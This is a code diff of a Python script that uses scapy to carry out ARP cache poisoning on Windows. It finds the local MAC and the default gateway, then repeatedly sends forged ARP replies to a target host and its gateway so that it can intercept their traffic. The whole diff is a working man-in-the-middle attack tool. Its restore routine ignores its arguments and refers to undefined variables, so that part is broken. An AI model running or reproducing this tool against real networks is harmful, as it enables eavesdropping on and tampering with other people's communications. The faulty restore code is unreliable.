@@ -2,51 +2,99 @@
 from socket import timeout
 import scapy.all as sc
 import sys,argparse
+import time
+import subprocess
+
+
+# reference code:
+# https://www.programcreek.com/python/example/103593/sc.all.srp
+
+####################################################SETUP##################################################################
 
 def get_args():
     parser = argparse.ArgumentParser()
     parser.add_argument("-t","--target-ip",dest="tarIP",help="Enter a target IP.")
-    parser.add_argument("-g","--gatway-ip",dest="tarGatway",help="Enter a gatway IP.")
     options = parser.parse_args()
     return options
 
-# reference code:
-# https://www.programcreek.com/python/example/103593/scapy.all.srp
-class fc:
-        rw = '\033[31;107m'
-        r = '\033[38;5;196m'
-        pink_violet = '\033[38;5;206;48;5;57m'
-        end = '\033[0m'
-        pink = '\033[38;5;206m'
-        yellow = '\033[0;33;40m'
-        purple = '\033[0;35m'
-        cyan = '\033[36m'
-        g = '\033[38;5;154m'
-        b = '\033[38;5;45m'
-def getMac(ip):
-    ar = scapy.ARP(pdst=ip)
-    bc = scapy.Ether(dst  = 'ff:ff:ff:ff:ff:ff')
-    arbc = bc/ar
-    al = scapy.srp(arbc,timeout=1)#try without this first to see full list//[0]//#could use srp1- only returns the first answer
-    print(al)
-    #return answered_list[0][1].hwsrc   // should be single result for the scan program 
 
-def spoof(targetIP,spoofIP):
-    targetMac = getMac(targetIP)
-    pkt = scapy.ARP(op=2, pdst = targetIP, hwdst = targetMac, psrc = spoofIP)
-    sc.send(pkt)
-pktCounter = 0 
+def getWinMac():
+    pipecmd_gm = 'getmac /fo list /v | findstr "Address:"'
+    mac = subprocess.check_output(pipecmd_gm, shell = True)
+    macLst = (mac.split())
+    mac = macLst[-1]
+    mac = mac.decode()
+    mac = mac.replace('-',':')
+    return mac
+
+
+def getGateway():
+    pipecmdIP = 'ipconfig | findstr "Default Gateway"'
+    cmd = subprocess.check_output(pipecmdIP,shell = True)
+    cmd = cmd.split()
+    mac = cmd[-1]
+    mac = mac.decode()
+    return mac
+
+
+def getMac(address):
+    request = sc.ARP(pdst = address)
+    broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
+    broadcast.src = myMac  
+    request_broadcast = broadcast/request        
+    answered_list= sc.srp(request_broadcast,timeout = 5,verbose=False)[0]
+    if len(answered_list) > 0:
+        targetMac = answered_list[0][1].hwsrc
+        print(f'\rConfirmed MAC address: {targetMac} for {address}.')
+    else:
+        print(f'\rNo ARP response from target, sending broadcast to {address}')
+        targetMac = "ff:ff:ff:ff:ff:ff"
+    return targetMac
+
+
+def spoof(dstIP,dstMAC,srcIP,srcMAC):
+    pkt = sc.ARP(op=2, pdst = dstIP, hwdst = dstMAC, psrc = srcIP, hwsrc = srcMAC)
+    sc.send(pkt,verbose = False)
+
+
+def restore(dstIP,dstMAC,srcIP,srcMAC):
+    pkt = sc.ARP(op=2,pdst=tarIP,hwdst=tarMac,psrc=tarGateway,hwsrc=gatewayMac) 
+    sc.send(pkt, count=4,verbose=False)
+
+######################################################VAR#######################################################
+
+opt = get_args()
+myMac = getWinMac()
+gatewayIP = getGateway()
+targetMAC = getMac(opt.tarIP)
+gatewayMAC = getMac(gatewayIP)
+pktCounter = 0
+
+
+print('Target IP: {}'.format(opt.tarIP))
+print('Target MAC: {}'.format(targetMAC))
+print('Gateway IP: {}'.format(gatewayIP))
+print('Gateway MAC: {}'.format(gatewayMAC))
+ 
+##################################################RUN#######################################################################
+
 try:
     while True:
-        spoof(opt.tarIP,opt.tarGatway)
-        spoof(opt.tarGatway,opt.tarIP)
+        spoof(opt.tarIP,targetMAC,gatewayIP,myMac)
+        spoof(gatewayIP,gatewayMAC,opt.tarIP,myMac)
         pktCounter = pktCounter + 2
-        print(f'\r{fc.pink_violet}[+]{fc.end} {fc.b}Packets sent: {pktCounter}{fc.end}',end='')
+        print(f'\r[+] Packets sent: {pktCounter}',end='')
+        time.sleep(2)
+
+
 except Exception as e:
-    print(f'\tError: {fc.rw}{e}{fc.end}')
+    print(f'\tError: {e}')
     sys.exit()
 
 
 except KeyboardInterrupt:
-    print('Abort')
+    print('Abort\nRestoring ARP table')
+    restore(opt.tarIP,targetMAC,gatewayIP,gatewayMAC)
+    restore(gatewayIP,gatewayMAC,opt.tarIP,targetMAC)
+    sys.exit()
 
